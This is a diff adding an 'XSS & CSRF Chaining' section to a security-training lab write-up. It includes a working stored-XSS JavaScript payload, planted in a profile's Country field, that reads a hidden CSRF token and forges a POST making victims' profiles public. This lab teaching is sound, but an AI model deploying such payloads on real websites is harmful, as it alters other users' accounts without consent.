@@ -27,6 +27,8 @@
       - [Example](#example-4)
     - [CSRF - POST-based](#csrf---post-based)
       - [Example](#example-5)
+    - [XSS \& CSRF Chaining](#xss--csrf-chaining)
+      - [Example](#example-6)
 
 ---
 
@@ -525,3 +527,67 @@ While still loggen in as Julie Rogers, open a new tab and visit the ```http://cs
 
 ![csrf 9](../../../images/session_security_csrf9.png)
 
+### XSS & CSRF Chaining
+
+#### Example
+
+Log in with the given credentials, activate Burp and click "Make Public!".
+
+![csrf 10](../../../images/session_security_csrf10.png)
+
+... leads to:
+
+![csrf 11](../../../images/session_security_csrf11.png)
+
+Forward all requests so that Ela Stienen's profile becomes public.
+
+The payload you need to specify in the _Country Field_ of Ela Stienen's profile to successfully execute CSRF:
+
+```javascript
+<script>
+// part1: creates an ObjectVariable called req, which you will be using to generate a request
+var req = new XMLHttpRequest();
+// is allowing you to get ready to send HTTP requests
+req.onload = handleResponse;
+// the 'onload' event handler performs an action once the page has been loaded
+req.open('get','/app/change-visibility',true);
+// request method, targeted path, continuation of execution
+req.send();
+// will send everything you constructed in the HTTP request
+// part1
+// part2: defines a function called 'handleResponse'
+function handleResponse(d) {
+    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
+    // defines a variable called 'token', which gets the value of 'responseText'
+    // '/name="csrf" type="hidden" value="(\w+)"/)[1];' looks for a hidden input field called 'csrf' and \w+ matches one or more alphanumeric chars
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/app/change-visibility', true);
+    // changes the method from GET to POST
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    // sets 'Content-Type' to 'application/x-www-form-urlencoded'
+    changeReq.send('csrf='+token+'&action=change');
+    // sends the request with one param called 'csrf' having the value of the 'token' variable, and another called 'action' with the value 'change'
+};
+// part2
+</script>
+```
+
+Now, try to make the victim's profile public.
+
+First, submit the full payload to the _Country Field_ of Ela Stienen's profile and click "Save".
+
+![csrf 12](../../../images/session_security_csrf12.png)
+
+Open a new private window, navigate to the website again, and log in using different credentials.
+
+This user has its profile "private". No "Share" functionality exists.
+
+![csrf 13](../../../images/session_security_csrf13.png)
+
+Open a new tab and browse Ela Stienen's public profile by navigating to ```http://minilab.htb.net/profile?email=ela.stienen@example.com```.
+
+Now, if you go back to the victim's usual profile page and refresh/reload the page, you should see that his profile became "public".
+
+![csrf 14](../../../images/session_security_csrf14.png)
+
+You just executed a CSRF-attack through XSS, bypassing the _same origin/same site_ protections in place.
